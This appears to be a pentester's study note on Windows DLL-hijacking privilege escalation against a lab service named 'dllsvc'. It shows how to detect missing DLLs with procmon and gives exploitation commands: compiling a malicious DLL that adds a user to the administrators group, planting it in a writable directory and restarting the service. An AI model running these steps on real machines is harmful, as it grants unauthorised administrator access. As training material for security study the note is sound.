# Detection
---
- We can use tools like : **`PowerSploit`**
- Using **procmon** (required Admin Priv)
	- **Add** a filter with **"Result"** **is** **"NAME NOT FOUND"**	- ![[Pasted image 20250418145103.png]]
	- **Add** another filter with "**Path**"  **"Ends with" ".dll"**
		![[Pasted image 20250418145513.png]]
	- **Apply and OK**

	- Stop/Start the vulnerable service with on `cmd.exe`(only works on cmd, not on powershell):
		- `sc stop dllsvc`
		- `sc start dllsvc`
	- We can see the list of directories this .dll file is searched for, the `C:\Temp\` one is writable by us:
		- ![[Pasted image 20250418152952.png]]

# Exploitation
---
- We can either created a malicious `.dll`file to get a reverse shell
- Or we can add our user with a `.dll`file
	- ![[Pasted image 20250418153153.png]]
	- `cmd.exe /k net localgroup administrators user /add`
	- ![[Pasted image 20250418153406.png]]
	- Compile:
		- `x86_64-w64-mingw32-gcc malicious_dll.c -shared -o hijackme.dll`
		- ![[Pasted image 20250418153604.png]]
	- Transfer the file to:
		- `C:\Temp\`
		- ![[Pasted image 20250418153733.png]]
	- Start and stop the service:
		- `sc stop dllsvc`
		- `sc start dllsvc`
		- ![[Pasted image 20250418153945.png]]
	- We won  :)